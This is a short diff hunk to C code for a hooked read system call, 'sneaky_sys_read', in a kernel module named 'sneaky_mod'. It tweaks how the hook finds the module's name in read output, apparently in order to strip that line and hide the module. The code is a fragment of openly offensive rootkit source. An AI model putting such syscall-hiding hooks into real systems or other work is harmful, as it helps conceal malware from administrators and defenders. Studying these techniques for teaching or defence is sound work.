@@ -90,7 +90,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
   ssize_t nread;
   nread = original_read(fd, buf, count);
   if (nread > 0) {
-    void *target = strnstr(buf, "sneaky_mod", nread);
+    void *target = strnstr(buf, "sneaky_mod ", nread);
     if (target != NULL) {
       void *end = strnstr(target, "\n", nread - (target - buf));
       if (end != NULL) {
